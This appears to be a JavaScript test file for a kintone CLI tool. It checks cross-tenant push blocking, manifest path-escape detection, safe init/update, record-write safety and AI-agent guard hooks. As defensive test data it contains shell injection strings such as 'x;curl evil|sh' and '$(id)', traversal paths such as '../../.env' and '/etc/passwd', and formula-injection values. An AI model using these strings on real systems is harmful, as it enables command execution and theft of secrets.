    expect("tenant: 壊れた app.json は判定できないので止めない", recordedHost(path.join(tmp0, "broken")) === undefined && !isOtherTenant(path.join(tmp0, "broken"), "example.cybozu.com"), "broken flagged");
    fs.mkdirSync(path.join(tmp0, "spaceOther"), { recursive: true });
    fs.writeFileSync(path.join(tmp0, "spaceOther", "space.json"), JSON.stringify({ id: "2", domain: "other.cybozu.com" }), "utf8");
    expect("tenant: space.json.domain も取得元の判定に使う", isOtherTenant(path.join(tmp0, "spaceOther"), "example.cybozu.com") && !isOtherTenant(path.join(tmp0, "spaceOther"), "other.cybozu.com"), "space.json.domain check failed");
  } finally {
    fs.rmSync(tmp0, { recursive: true, force: true });
  }

  // 別ドメインで取得した app-77 / space-88 がある作業フォルダで、今のドメイン（モック）に対して pull kintone する。
  // モックには app-77 / space-88 が無い（404）。取得元が違うので、削除済みとして deleted/ へ動かしてはいけない。
  const appExists = { value: false };
  const mock = await startStatefulMock((method, url) => {
    if (method !== "GET") return null;
    if (url.pathname === "/k/v1/apps.json") return [200, { apps: [] }];
    if (url.pathname === "/k/v1/app.json") return appExists.value ? [200, { appId: "77", code: "", name: "同じ ID のアプリ", spaceId: null }] : [404, { code: "GAIA_AP01", message: "指定したアプリが見つかりません。" }];
    if (url.pathname === "/k/v1/space.json") return appExists.value ? [200, { id: "88", name: "同じ ID のスペース" }] : [404, { code: "GAIA_SI01", message: "指定したスペースが見つかりません。" }];
    return null;
  });
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-tenant-"));
  try {
    const lines = Object.entries(mockEnv(mock.baseUrl)).map(([k, v]) => `${k}=${v}`);
    fs.writeFileSync(path.join(tmp, ".env"), `${lines.join("\n")}\nKINT_ORIGIN_ALLOW_PUSH_APP=true\nKINT_ORIGIN_ALLOW_PUSH_SPACE=true\n`, "utf8");
    const app77 = path.join(tmp, "data", "kintone", "apps", "app-77");
    fs.mkdirSync(app77, { recursive: true });
    fs.writeFileSync(path.join(app77, "app.json"), JSON.stringify({ appId: "77", name: "別ドメインのアプリ", domain: "another-domain.cybozu.com" }), "utf8");
    const space88 = path.join(tmp, "data", "kintone", "spaces", "space-88");
    fs.mkdirSync(space88, { recursive: true });
    fs.writeFileSync(path.join(space88, "space.json"), JSON.stringify({ id: "88", name: "別ドメインのスペース", domain: "another-domain.cybozu.com" }), "utf8");

    const pulled = await runCliAsync(["pull", "kintone"], tmp, mockEnv(mock.baseUrl));
    expect(
      "tenant: 取得元が別ドメインのアプリ・スペースは、環境に無くても deleted/ へ移動しない",
      pulled.status === 0 &&
        fs.existsSync(app77) &&
        !fs.existsSync(path.join(tmp, "data", "kintone", "deleted", "apps", "app-77")) &&
        fs.existsSync(space88) &&
        !fs.existsSync(path.join(tmp, "data", "kintone", "deleted", "spaces", "space-88")),
      `status=${pulled.status}\n${pulled.stderr}`
    );
    expect("tenant: 移動しなかった理由（取得元と接続先の違い）をログに出す", pulled.stderr.includes("another-domain.cybozu.com") && pulled.stderr.includes("deleted/ へは移動しません"), pulled.stderr);
    expect("tenant: コマンド開始時に接続先（host・ユーザー）を表示する", pulled.stderr.includes("接続先: ") && pulled.stderr.includes("ユーザー: u"), pulled.stderr);


    // push app / push space: 同じ ID のアプリ・スペースが今の接続先にも存在する場合（別ドメインの .env のまま実行した典型例）。
    // 取得元（app.json.domain / space.json.domain）が違うので、何も書き込まずに中断する。
    appExists.value = true;
    mock.requests.length = 0;
    const pushed = await runCliAsync(["push", "app", "--id", "77", "-y"], tmp, mockEnv(mock.baseUrl));
    expect(
      "tenant: 取得元が別ドメインのアプリへの push app は、取得元の違いを理由に中断する（exit 1）",
      pushed.status === 1 && pushed.stderr.includes("取得元（another-domain.cybozu.com）と、今の接続先") && pushed.stderr.includes("接続先: "),
      `status=${pushed.status}\n${pushed.stderr}`
    );
    const pushedSpace = await runCliAsync(["push", "space", "--id", "88", "-y"], tmp, mockEnv(mock.baseUrl));
    expect(
      "tenant: 取得元が別ドメインのスペースへの push space は、取得元の違いを理由に中断する（exit 1）",
      pushedSpace.status === 1 && pushedSpace.stderr.includes("取得元（another-domain.cybozu.com）と、今の接続先"),
      `status=${pushedSpace.status}\n${pushedSpace.stderr}`
    );
    expect("tenant: 取得元が別ドメインのアプリ・スペースへは何も書き込まない", !mock.requests.some((r) => !r.startsWith("GET ")), mock.requests.join("\n"));
  } finally {
    mock.server.close();
    fs.rmSync(tmp, { recursive: true, force: true });
  }

  // 環境変数が .env を上書きしているときの警告。
  const tmp2 = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-envconflict-"));
  try {
    fs.writeFileSync(path.join(tmp2, ".env"), "CYBOZU_BASE_URL=https://file.cybozu.com\nCYBOZU_USERNAME=file-user\nCYBOZU_PASSWORD=pw\n", "utf8");
    const r = runCli(["pull", "index"], tmp2, { CYBOZU_BASE_URL: "http://127.0.0.1:1", CYBOZU_USERNAME: "shell-user", CYBOZU_PASSWORD: "pw" });
    expect(
      "tenant: シェルの環境変数が .env と食い違うときは、優先されることを警告する",
      r.stderr.includes("環境変数 CYBOZU_BASE_URL, CYBOZU_USERNAME が、このフォルダの .env の値と異なります"),
      r.stderr
    );
  } finally {
    fs.rmSync(tmp2, { recursive: true, force: true });
  }
}

// B-9: マニフェストに customize/ の外を指すファイルがあるときは、反映せずに中断する（差分に出ないファイルを送らない）。
async function customizeManifestTests({ expect, runCli, dist }) {
  const { manifestOutsideEntries, manifestFiles } = await import(dist("kintone/customize.js"));

  const manifest = {
    desktop: { js: ["desktop/js/a.js", "https://cdn.example.com/lib.js", "../../.env", "/etc/passwd", "C:\\secrets\\x.js", "sub\\..\\..\\escape.js", "./ok.js"], css: [] },
    mobile: { js: [], css: ["../up.css"] }
  };
  const outside = manifestOutsideEntries(manifest);
  expect(
    "customize: 範囲外のエントリ（.. ・絶対パス・ドライブ指定・区切りを混ぜた ..）を検出し、URL と範囲内のファイルは検出しない",
    ["../../.env", "/etc/passwd", "C:\\secrets\\x.js", "sub\\..\\..\\escape.js", "../up.css"].every((entry) => outside.includes(entry)) &&
      !outside.includes("desktop/js/a.js") &&
      !outside.includes("https://cdn.example.com/lib.js") &&
      !outside.includes("./ok.js"),
    JSON.stringify(outside)
  );
  // 差分・承認の表示に使う manifestFiles は、範囲外を従来どおり除く（検出と表示の食い違いが、止める理由）。
  expect("customize: 差分の表示（manifestFiles）は範囲外を含めない", !manifestFiles(manifest).some((f) => f.includes("..") || f.startsWith("/")), JSON.stringify(manifestFiles(manifest)));

  // diff app / push app（inspectApp）は、範囲外のエントリを検出したら API・ファイル読み込みの前に止める。
  const { spawnSync } = await import("node:child_process");
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-manifest-"));
  try {
    const git = (args) => {
      const r = spawnSync("git", args, { cwd: tmp, encoding: "utf8" });
      if (r.status !== 0) throw new Error(r.stderr || r.stdout);
    };
    const appDir = path.join(tmp, "data", "kintone", "apps", "app-1");
    fs.mkdirSync(path.join(appDir, "customize"), { recursive: true });
    fs.writeFileSync(path.join(appDir, "customize", "customize-manifest.json"), JSON.stringify({ desktop: { js: ["../../.env"], css: [] }, mobile: { js: [], css: [] } }), "utf8");
    git(["init"]);
    git(["config", "user.email", "test@example.com"]);
    git(["config", "user.name", "test"]);
    git(["add", "."]);
    git(["commit", "-m", "init"]);
    const res = runCli(["diff", "app", "--id", "1"], tmp);
    expect("customize: diff app は範囲外のエントリがあれば中断し、対象を示す", res.status === 1 && res.stderr.includes("範囲外のファイル") && res.stderr.includes("../../.env"), `${res.status}\n${res.stderr}`);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

// B-12: init / update をツール本体で実行しない。update は上書きの前に一覧を示して確認する（非対話は -y が必要）。
async function updateInitTests({ expect, runCli, ROOT, dist }) {
  // 本体リポジトリでは、書き込みの前に拒否する（本体の README.md・AGENTS.md・settings.json を上書きしない）。
  const before = ["README.md", "AGENTS.md", "CLAUDE.md", ".claude/settings.json"].map((f) => fs.readFileSync(path.join(ROOT, f), "utf8"));
  for (const command of ["init", "update"]) {
    const r = runCli([command, "-y"].slice(0, command === "update" ? 2 : 1), ROOT);
    expect(
      `${command}: ツール本体のフォルダでは実行を拒否する（exit 1・案内あり）`,
      r.status === 1 && r.stderr.includes("ツール本体（kint-origin-tools）のフォルダでは実行できません") && r.stderr.includes("ドメイン用のフォルダ"),
      `status=${r.status}\n${r.stderr}`
    );
  }
  const after = ["README.md", "AGENTS.md", "CLAUDE.md", ".claude/settings.json"].map((f) => fs.readFileSync(path.join(ROOT, f), "utf8"));
  expect("init/update の拒否で、本体の README.md・AGENTS.md・CLAUDE.md・.claude/settings.json は変わらない", before.every((text, i) => text === after[i]), "tool files changed");

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-update-"));
  try {
    const init = runCli(["init"], tmp);
    expect("update 検査の準備: init が成功", init.status === 0, init.stderr);

    // 共有モジュールが欠け、3入口が配布版と違うドメインを、update で配布版へ戻す。
    const { planAgents } = await import(dist("agents.js"));
    const coreRel = ".agents/hooks/kint-origin-guard-core.mjs";
    const coreFile = path.join(tmp, coreRel);
    const coreSource = fs.readFileSync(coreFile, "utf8");
    fs.unlinkSync(coreFile);
    const entries = ["claude", "cursor", "codex"].map((tool) => `.${tool}/hooks/kint-origin-guard.mjs`);
    for (const entry of entries) fs.writeFileSync(path.join(tmp, entry), "// modified guard\n", "utf8");
    const plan = planAgents({ targetRoot: tmp });
    expect("update 計画: 共有モジュールを1回だけ入口より先に新規配布し、3入口を更新する", plan[0]?.path === coreRel && plan[0]?.status === "new" && plan.filter((item) => item.path === coreRel).length === 1 && entries.every((entry) => plan.some((item) => item.path === entry && item.status === "changed")), JSON.stringify(plan.map(({ path, status }) => ({ path, status }))));
    expect("update 計画は共有モジュールを書き込まない", !fs.existsSync(coreFile), "plan wrote the core");

    // 非対話で -y なし: 何も書かず、-y を案内して中断する。
    const claude = path.join(tmp, "CLAUDE.md");
    fs.writeFileSync(claude, "# 独自の編集\n", "utf8");
    const noTty = runCli(["update"], tmp);
    expect(
      "update: 非対話（TTY なし）で -y が無いときは、何も書かずに -y を案内して中断する",
      noTty.status === 1 && noTty.stderr.includes("-y を付けて再実行") && fs.readFileSync(claude, "utf8") === "# 独自の編集\n",
      `status=${noTty.status}\n${noTty.stderr}`
    );
    expect("update 中断: 共有モジュールも3入口も書き換えない", !fs.existsSync(coreFile) && entries.every((entry) => fs.readFileSync(path.join(tmp, entry), "utf8") === "// modified guard\n"), "aborted update changed guards");

    // -y: 上書きの前に一覧（変わるファイル・残す kint-origin-local-*）を表示してから書き込む。
    fs.mkdirSync(path.join(tmp, ".claude", "skills", "kint-origin-local-mine"), { recursive: true });
    fs.writeFileSync(path.join(tmp, ".claude", "skills", "kint-origin-local-mine", "SKILL.md"), "---\nname: kint-origin-local-mine\ndescription: mine\n---\n", "utf8");
    fs.mkdirSync(path.join(tmp, ".agents", "skills", "kint-origin-mine"), { recursive: true });
    // 接頭辞の無い独自スキル（.cursor/skills も調べる）と、外部addonのリンク名（kint-origin-addon-*）。
    fs.mkdirSync(path.join(tmp, ".cursor", "skills", "plain-skill"), { recursive: true });
    fs.mkdirSync(path.join(tmp, ".claude", "skills", "kint-origin-addon-x"), { recursive: true });
    const ok = runCli(["update", "-y"], tmp);
    let summary = {};
    try {
      summary = JSON.parse(ok.stdout);
    } catch {
      /* 下の expect で失敗として出る */
    }
    expect(
      "update -y: 上書きされるファイルを一覧で示し、独自の編集の消失と kint-origin-local-* の置き場を案内する",
      ok.status === 0 && ok.stderr.includes("上書き: CLAUDE.md") && ok.stderr.includes("独自の編集があると失われます") && ok.stderr.includes("kint-origin-local-<名前>"),
      `status=${ok.status}\n${ok.stderr}`
    );
    expect("update -y: 書き込んだファイルだけを updated に出し、内容が同じものは unchanged として数える", summary.updated?.includes("CLAUDE.md") && summary.unchanged > 0 && !summary.updated?.includes("README.md"), JSON.stringify(summary));
    expect("update -y: 共有モジュールを作成し、3入口を同じ更新で最新化する", summary.updated?.includes(coreRel) && entries.every((entry) => summary.updated?.includes(entry)) && fs.readFileSync(coreFile, "utf8") === coreSource && ok.stderr.includes(coreRel), JSON.stringify(summary.updated));
    expect(
      "update -y: 独自スキル（kint-origin-local-*）を preserved に出し、残す。外部addonの kint-origin-addon-* は出さない",
      summary.preserved?.includes(".claude/skills/kint-origin-local-mine") && !summary.preserved?.some((p) => p.includes("kint-origin-addon-")) && fs.existsSync(path.join(tmp, ".claude", "skills", "kint-origin-local-mine", "SKILL.md")),
      JSON.stringify(summary.preserved)
    );
    expect("update -y: 予約名（kint-origin-*）で配布物に無いスキルは警告し、上書きも削除もしない", summary.warnings?.some((w) => w.includes("kint-origin-mine")) && fs.existsSync(path.join(tmp, ".agents", "skills", "kint-origin-mine")), JSON.stringify(summary.warnings));
    expect(
      "update -y: 接頭辞の無い独自スキル（.cursor/skills を含む）は kint-origin-local-<名前> への改名を警告し、上書きも削除もしない",
      summary.warnings?.some((w) => w.includes(".cursor/skills/plain-skill") && w.includes("kint-origin-local-plain-skill")) && fs.existsSync(path.join(tmp, ".cursor", "skills", "plain-skill")) && ok.stderr.includes("kint-origin-local-plain-skill"),
      JSON.stringify(summary.warnings)
    );
    expect("update -y: 外部addonのリンク名（kint-origin-addon-*）は警告も preserved も出さない", !summary.warnings?.some((w) => w.includes("kint-origin-addon-x")) && !JSON.stringify(summary.preserved).includes("kint-origin-addon-x"), JSON.stringify({ preserved: summary.preserved, warnings: summary.warnings }));

    // 2 回目: すべて最新なら、書き込まずにそう伝える。
    const again = runCli(["update", "-y"], tmp);
    let againSummary = {};
    try {
      againSummary = JSON.parse(again.stdout);
    } catch {
      /* 下の expect で失敗として出る */
    }
    expect("update: 2 回目は書き込むファイルが無く、すべて最新と伝える", again.status === 0 && againSummary.updated?.length === 0 && again.stderr.includes("すべて最新です"), `${again.stdout}\n${again.stderr}`);

    // init: 既存の保護用ファイルをスキップしたら警告する。
    const tmp2 = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-init-skip-"));
    try {
      fs.mkdirSync(path.join(tmp2, ".claude"), { recursive: true });
      fs.writeFileSync(path.join(tmp2, ".claude", "settings.json"), "{}\n", "utf8");
      fs.mkdirSync(path.join(tmp2, ".cursor"), { recursive: true });
      fs.writeFileSync(path.join(tmp2, ".cursor", "hooks.json"), "{}\n", "utf8");
      fs.mkdirSync(path.join(tmp2, ".agents", "hooks"), { recursive: true });
      fs.writeFileSync(path.join(tmp2, coreRel), "// existing policy\n", "utf8");
      const skip = runCli(["init"], tmp2);
      expect(
        "init: 既存の settings.json / hooks.json を生成しなかったときは、保護が入っていない可能性を警告し、update を案内する",
        skip.status === 0 && skip.stderr.includes("既存のため生成しなかった保護用のファイル") && skip.stderr.includes(".claude/settings.json") && skip.stderr.includes(".cursor/hooks.json") && skip.stderr.includes("kint-origin update"),
        `status=${skip.status}\n${skip.stderr}`
      );
      expect("init: 既存の settings.json は上書きしない（従来どおり）", fs.readFileSync(path.join(tmp2, ".claude", "settings.json"), "utf8") === "{}\n", "settings.json changed");
      expect("init: 既存の共有モジュールも温存し、update を案内する", fs.readFileSync(path.join(tmp2, coreRel), "utf8") === "// existing policy\n" && skip.stderr.includes(coreRel) && skip.stderr.includes("kint-origin update"), skip.stderr);
    } finally {
      fs.rmSync(tmp2, { recursive: true, force: true });
    }

    // init: 既存の .gitignore は行を変えずに、管理ブロックと、雛形の除外のうち無い行を1回だけ追記する。
    const initIgnoreCase = (name, setup) => {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), `kint-origin-init-ignore-${name}-`));
      setup(dir);
      return dir;
    };
    const parseJson = (text) => {
      try {
        return JSON.parse(text);
      } catch {
        return {};
      }
    };
    const ignoreDir = initIgnoreCase("append", (dir) => fs.writeFileSync(path.join(dir, ".gitignore"), "# mine\nnode_modules/\nrecords.csv\n!*.records.js\n", "utf8"));
    const crlfDir = initIgnoreCase("crlf", (dir) => fs.writeFileSync(path.join(dir, ".gitignore"), "node_modules/\r\n", "utf8"));
    const brokenDir = initIgnoreCase("broken", (dir) => fs.writeFileSync(path.join(dir, ".gitignore"), "# BEGIN kint-origin pull safety\n.env\n", "utf8"));
    const dirDir = initIgnoreCase("dir", (dir) => fs.mkdirSync(path.join(dir, ".gitignore")));
    try {
      const ignorePath = path.join(ignoreDir, ".gitignore");
      const first = runCli(["init"], ignoreDir);
      const after = fs.readFileSync(ignorePath, "utf8");
      const lines = after.split("\n");
      const count = (rule) => lines.filter((line) => line === rule).length;
      expect("init: 既存の .gitignore の行はそのまま先頭に残す", first.status === 0 && after.startsWith("# mine\nnode_modules/\nrecords.csv\n!*.records.js\n"), after);
      expect("init: 既存の .gitignore に .env の管理ブロックを1つ追記する", count("# BEGIN kint-origin pull safety") === 1 && count("# END kint-origin pull safety") === 1 && count(".env") === 1, after);
      expect(
        "init: 雛形の除外のうち無い行だけを追記し、既存の行・否定した行は重ねない",
        ["records/attachments/", "push/records/*/runs/", "push/import/*/runs/", ".DS_Store"].every((rule) => count(rule) === 1) && count("records.csv") === 1 && count("*.records.js") === 0 && !after.includes("/.kint-origin/addons/"),
        after
      );
      expect("init: 追記した .gitignore を copied に出し、警告しない", parseJson(first.stdout).copied?.includes(".gitignore") && !first.stderr.includes("警告: .gitignore"), `${first.stdout}\n${first.stderr}`);
      const again = runCli(["init"], ignoreDir);
      expect("init 再実行: 揃った .gitignore は変えず skipped に出す", again.status === 0 && fs.readFileSync(ignorePath, "utf8") === after && parseJson(again.stdout).skipped?.includes(".gitignore"), again.stdout);
      const updated = runCli(["update", "-y"], ignoreDir);
      expect("update: init が追記した .gitignore を変えない", updated.status === 0 && fs.readFileSync(ignorePath, "utf8") === after, `status=${updated.status}\n${updated.stderr}`);

      const crlf = runCli(["init"], crlfDir);
      const crlfText = fs.readFileSync(path.join(crlfDir, ".gitignore"), "utf8");
      expect("init: CRLF の .gitignore には CRLF のまま追記する", crlf.status === 0 && crlfText.startsWith("node_modules/\r\n") && crlfText.includes("\r\n.env\r\n") && !/[^\r]\n/.test(crlfText), JSON.stringify(crlfText));

      const broken = runCli(["init"], brokenDir);
      expect(
        "init: 管理ブロックが壊れた .gitignore は変えず、警告して init を続ける",
        broken.status === 0 && fs.readFileSync(path.join(brokenDir, ".gitignore"), "utf8") === "# BEGIN kint-origin pull safety\n.env\n" && broken.stderr.includes("警告: .gitignore の kint-origin 管理ブロック") && parseJson(broken.stdout).skipped?.includes(".gitignore") && fs.existsSync(path.join(brokenDir, "CLAUDE.md")),
        `${broken.stdout}\n${broken.stderr}`
      );

      const dirCase = runCli(["init"], dirDir);
      expect("init: .gitignore が通常ファイルでなければ、警告して init を続ける", dirCase.status === 0 && dirCase.stderr.includes("警告: .gitignore が通常ファイルではない") && parseJson(dirCase.stdout).skipped?.includes(".gitignore"), `${dirCase.stdout}\n${dirCase.stderr}`);
    } finally {
      for (const dir of [ignoreDir, crlfDir, brokenDir, dirDir]) fs.rmSync(dir, { recursive: true, force: true });
    }
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

// B-13: records の書き込みの安全。結果不明の判定・ジョブ名・再実行ガード・数式の無害化・@upload: の誤置換。
async function recordsSafetyTests({ expect, dist }) {
  const exec = await import(dist("kintone/recordExec.js"));
  const push = await import(dist("kintone/recordPush.js"));
  const job = await import(dist("kintone/recordJob.js"));
  const csv = await import(dist("kintone/recordCsv.js"));

  // 結果不明: 応答が返らなかった失敗（http.ts が uncertain を付ける）と 5xx は不明。4xx は確定で未反映。
  const serverError = Object.assign(new Error("POST /k/v1/bulkRequest.json failed: server"), { status: 502 });
  const rejected = Object.assign(new Error("POST /k/v1/bulkRequest.json failed (CB_VA01): invalid"), { status: 400 });
  const marked = Object.assign(new Error("接続が切れました"), { uncertain: true });
  expect("結果不明: 印（uncertain）のあるエラーは不明として扱う", exec.isUncertain(marked), "marked not uncertain");
  expect("結果不明: 4xx（サーバーが拒否）は確定で未反映、印の無いエラーも不明にしない", !exec.isUncertain(rejected) && !exec.isUncertain(new Error("x")) && !exec.isUncertain(undefined), "classification wrong");

  // http.ts が実際に印を付けること（5xx・タイムアウト・書き込みの接続断）。
  const http = await import(dist("http.js"));
  const policy = await import(dist("policy.js"));
  policy.activateGrants(["pull:kintone", "push:records"]);
  const env = { baseUrl: "http://127.0.0.1:1", username: "u", password: "p", language: "ja", apiIntervalMs: 0 };
  const attempt = async (fetchImpl, method) => {
    try {
      await http.fetchCybozuResponse(env, "http://127.0.0.1:1/k/v1/records.json", { method, body: method === "GET" ? undefined : {} }, { fetchImpl, retries: 0 });
      return undefined;
    } catch (error) {
      return error;
    }
  };
  const resp = (status) => new Response(JSON.stringify({ code: "X", message: "m" }), { status, headers: { "Content-Type": "application/json" } });
  const e502 = await attempt(async () => resp(502), "POST");
  const e400 = await attempt(async () => resp(400), "POST");
  const eReset = await attempt(async () => { throw Object.assign(new TypeError("fetch failed"), { cause: { code: "ECONNRESET" } }); }, "POST");
  const eResetGet = await attempt(async () => { throw Object.assign(new TypeError("fetch failed"), { cause: { code: "ECONNRESET" } }); }, "GET");
  const eTimeout = await attempt(async () => { throw Object.assign(new Error("t"), { name: "TimeoutError" }); }, "POST");
  expect("http: 書き込みの 502 は結果不明の印が付く", e502?.uncertain === true && e502.status === 502, String(e502?.message));
  expect("http: 書き込みの 400 は確定で未反映（印なし）", e400?.uncertain !== true && e400?.status === 400, String(e400?.message));
  expect("http: 書き込みの接続断（ECONNRESET）は結果不明の印が付く", eReset?.uncertain === true, String(eReset?.message));
  expect("http: 読み取り（GET）の接続断は結果不明にしない（再実行しても重複しない）", eResetGet?.uncertain !== true, String(eResetGet?.message));
  expect("http: タイムアウトは結果不明の印が付く", eTimeout?.uncertain === true && eTimeout.message.includes("タイムアウト"), String(eTimeout?.message));
  policy.activateGrants([]);

  const note = exec.failureNote({ bulks: [{ status: "failed" }], error: serverError }, "h");
  const noteWithMark = exec.failureNote({ bulks: [{ status: "failed" }], error: Object.assign(serverError, { uncertain: true }) }, "h");
  expect("結果不明の案内: 5xx でも「何も変更していません」と言わず、確認と再実行の重複を案内する", noteWithMark.includes("反映されたかどうか分かりません") && noteWithMark.includes("重複") && !noteWithMark.includes("何も変更していません"), noteWithMark);
  expect("確定で未反映（4xx 相当）の 1 回目の失敗は、従来どおり「何も変更していません」", exec.failureNote({ bulks: [{ status: "failed" }], error: rejected }, "h").includes("何も変更していません") && note.length > 0, "note wrong");

  // ジョブ名: 許可リスト方式。シェルの特殊文字・空白・予約名は拒否し、日本語と英数字は通す。
  const accepts = (name) => {
    try {
      job.validateJobName(name);
      return true;
    } catch {
      return false;
    }
  };
  expect("ジョブ名: 日本語・英数字・- _ . は通る", ["添付移行", "job-1", "my_job", "v1.2", "Q4売上"].every(accepts), "valid names rejected");
  const badNames = ["x;curl evil|sh", "a b", "a&b", "$(id)", "a'b", "a`b", "a!b", "a%b", "-x", "_x", ".x", "x.", "a..b", "", "a/b", "a\\b", "x".repeat(101)];
  expect("ジョブ名: シェルの特殊文字・空白・先頭の記号・長すぎる名前は拒否する", badNames.every((name) => !accepts(name)), badNames.filter(accepts).join(" / "));

  // 数式の無害化: preview.csv に使う関数。records.csv の合成（stringifyCsv）は変えない。
  expect("preview: = + - @ タブで始まる値は先頭に ' を付ける", ["=1+1", "+SUM(A1)", "-1", "@cmd", "\tx"].every((v) => csv.neutralizeFormula(v) === "'" + v), "not neutralized");
  expect("preview: 普通の値・空は変えない", ["abc", "", "1500", "【検証】"].every((v) => csv.neutralizeFormula(v) === v), "changed ordinary value");
  expect("records.csv の合成（stringifyCsv）は無害化しない（取得データを書き換えない）", csv.stringifyCsv([["=1+1"]]).includes("=1+1") && !csv.stringifyCsv([["=1+1"]]).includes("'=1+1"), csv.stringifyCsv([["=1+1"]]));

  // @upload: の置換は fileKey の値だけ。テキスト値に同じ文字列があっても触らない。
  const payload = { records: [{ id: 1, record: { 備考: { value: "@upload:u1 をメモ" }, 資料: { value: [{ fileKey: "@upload:u1" }, { fileKey: "real-key" }] } } }] };
  const filled = exec.fillUploads(payload, new Map([["u1", "KEY-1"]]));
  expect("@upload: の置換は fileKey の値だけにし、テキスト値は変えない", filled.records[0].record.資料.value[0].fileKey === "KEY-1" && filled.records[0].record.資料.value[1].fileKey === "real-key" && filled.records[0].record.備考.value === "@upload:u1 をメモ", JSON.stringify(filled));
  expect("@upload: の検出は fileKey の値だけ（テキスト値の同じ文字列を添付参照と誤認しない）", exec.uploadIdsIn(payload).join(",") === "u1" && exec.uploadIdsIn({ a: { value: "@upload:u9" } }).length === 0, JSON.stringify(exec.uploadIdsIn(payload)));
  expect("@upload: の置換は元の payload を変えない", payload.records[0].record.資料.value[0].fileKey === "@upload:u1", "payload mutated");

  // 再実行ガード: 同じ job.csv で、反映済み・一部反映・結果不明・実行中（強制終了）の実行があれば止める。戻し済み・確定で未反映は止めない。
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-rerun-"));
  try {
    const jobFile = path.join(tmp, "job.csv");
    fs.writeFileSync(jobFile, "op,to_app\nset,1\n", "utf8");
    const hash = push.hashJobFile(jobFile);
    const crlf = path.join(tmp, "crlf.csv");
    fs.writeFileSync(crlf, "op,to_app\r\nset,1\r\n", "utf8");
    expect("再実行ガード: job.csv のハッシュは改行コードの違いを無視する", push.hashJobFile(crlf) === hash, "hash differs by newline");
    fs.writeFileSync(crlf, "op,to_app\nset,2\n", "utf8");
    expect("再実行ガード: 内容が変われば別のハッシュ", push.hashJobFile(crlf) !== hash, "hash same for different content");
    const runsDir = path.join(tmp, "runs");
    const writeRun = (name, result, restored) => {
      fs.mkdirSync(path.join(runsDir, name), { recursive: true });
      if (result) fs.writeFileSync(path.join(runsDir, name, "result.json"), JSON.stringify(result), "utf8");
      if (restored) fs.writeFileSync(path.join(runsDir, name, "restored.json"), "{}", "utf8");
    };
    writeRun("20261101-100000", { kind: "push", jobHash: hash, applied: true });
    writeRun("20261101-110000", { kind: "push", jobHash: hash, applied: false, partial: true });
    writeRun("20261101-120000", { kind: "push", jobHash: hash, applied: false, uncertain: true });
    writeRun("20261101-130000", { kind: "push", jobHash: hash, status: "running", applied: false });
    writeRun("20261101-140000", { kind: "push", jobHash: hash, applied: true }, true);
    writeRun("20261101-150000", { kind: "push", jobHash: hash, applied: false, note: "書き込み前に中断しました" });
    writeRun("20261101-160000", { kind: "push", jobHash: "other-hash", applied: true });
    writeRun("20261101-170000-diff", { kind: "push", jobHash: hash, applied: true });
    const prior = push.findPriorRuns(tmp, hash);
    expect("再実行ガード: 反映済み・一部反映・結果不明・実行中のまま残った記録を検出する", prior.map((p) => `${p.runId}:${p.state}`).join(",") === "20261101-100000:applied,20261101-110000:partial,20261101-120000:uncertain,20261101-130000:running", JSON.stringify(prior));
    expect("再実行ガード: 戻し済み・確定で未反映・別の内容・diff の記録は対象にしない", !prior.some((p) => ["20261101-140000", "20261101-150000", "20261101-160000", "20261101-170000-diff"].includes(p.runId)), JSON.stringify(prior));
    const message = push.priorRunMessage("j", prior);
    expect("再実行ガード: 中断の理由・重複の危険・確認方法・再実行の方法を案内する", message.includes("重複") && message.includes("show records") && message.includes("job.csv を編集") && message.includes("--restore"), message);
    expect("再実行ガード: 実行記録が無いジョブは対象なし", push.findPriorRuns(path.join(tmp, "none"), hash).length === 0, "found in empty dir");
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

// B-14: 配布する権限・ガード。独自スキル（kint-origin-local-*）の data/ を誤判定しない・保護を AI が外せない・.env を読ませない。
async function guardSafetyTests({ expect, ROOT, dist }) {
  const { generateAgents } = await import(dist("agents.js"));
  const guardRoot = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-guards-"));
  try {
    generateAgents({ targetRoot: guardRoot });
    const { spawnSync } = await import("node:child_process");
    const claudeGuard = path.join(guardRoot, ".claude", "hooks", "kint-origin-guard.mjs");
    const cursorGuard = path.join(guardRoot, ".cursor", "hooks", "kint-origin-guard.mjs");
    const runClaude = (payload, raw) => {
      const r = spawnSync(process.execPath, [claudeGuard], { input: raw ?? JSON.stringify(payload), encoding: "utf8" });
      const out = (r.stdout || "").trim();
      return { status: r.status, decision: out ? JSON.parse(out).hookSpecificOutput?.permissionDecision : "", raw: out };
    };
    const runCursor = (command) => {
      const r = spawnSync(process.execPath, [cursorGuard], { input: JSON.stringify({ command }), encoding: "utf8" });
      return JSON.parse((r.stdout || "{}").trim());
    };
    const cwd = path.join(os.tmpdir(), "kint-origin-guard-cwd");
    const write = (file_path) => runClaude({ tool_name: "Write", tool_input: { file_path }, cwd });

    // data/ の誤判定: 第三者の独自スキルや作業フォルダの中の data/ を、取得物と誤認して deny しない。
    for (const rel of [".claude/skills/kint-origin-local-report/data/foo.json", ".agents/skills/kint-origin-local-x/data/rows.csv", "temp/triage/c1/data/x.json", "doc/data/notes.md", "push/records/job/data/in.csv"]) {
      expect(`guard: 独自のフォルダの中の data/（${rel}）は取得物と誤認せず素通り`, write(rel).decision === "", write(rel).raw);
      expect(`guard: 絶対パスでも同じ（${rel}）`, write(path.join(cwd, rel)).decision === "", write(path.join(cwd, rel)).raw);
    }
    // 取得物の保護は維持: ルート相対の data/、ルートを特定できない絶対パスの data/kintone/ ・ data/cybozu-common/。
    expect("guard: ルート相対の data/ の取得物は deny", write("data/kintone/apps/app-1/app.json").decision === "deny", write("data/kintone/apps/app-1/app.json").raw);
    expect("guard: ルートを特定できない絶対パスの data/kintone/ の取得物も deny", write("C:/elsewhere/data/kintone/apps/app-1/app.json").decision === "deny", write("C:/elsewhere/data/kintone/apps/app-1/app.json").raw);
